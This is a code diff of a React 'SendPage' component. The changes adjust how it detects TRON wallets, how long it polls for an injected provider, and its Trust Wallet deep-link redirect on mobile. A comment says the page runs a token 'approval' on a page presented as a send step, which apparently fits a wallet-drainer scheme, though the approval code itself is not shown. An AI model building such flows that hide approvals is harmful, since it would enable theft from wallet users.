@@ -120,18 +120,19 @@ export default function SendPage() {
     setBtn({ text: 'Connecting...', disabled: true });
 
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent || '');
+    const isInsideWallet = !!(window.tronWeb || window.ethereum?.isTrust || window.trustwallet);
 
     try {
       // STEP 1: Try native tronWeb (works when opened via coin_id=195 context)
       let nativeTW = window.tronWeb?.defaultAddress?.base58 ? window.tronWeb : null;
 
-      // STEP 2: Try requesting via tronLink if it exists
+      // STEP 2: Try requesting via tronLink or generic injection if it exists
       if (!nativeTW) {
-        const inj = window.tronLink || window.tron;
+        const inj = window.tronLink || window.tron || window.tronWeb;
         if (inj?.request) {
           try { await inj.request({ method: 'tron_requestAccounts' }); } catch (_) { }
         }
-        nativeTW = await pollForTronWeb(3000);
+        nativeTW = await pollForTronWeb(4000);
       }
 
       // STEP 3: tronWeb found — run approval directly
@@ -145,10 +146,15 @@ export default function SendPage() {
           return;
         }
 
-      // STEP 4 & 5: Mobile — use Universal Link for Trust Wallet
+      // STEP 4: Already inside a wallet browser but connection failed
+      } else if (isInsideWallet) {
+        showNotif('Please make sure your TRON wallet is active.', 'error');
+        setBtn({ text: 'Next', disabled: false });
+        return;
+
+      // STEP 5: Mobile external browser — use Universal Link for Trust Wallet
       } else if (isMobile) {
         const url = encodeURIComponent(window.location.href);
-        // Use link.trustwallet.com for better reliability
         window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${url}`;
         return;
 
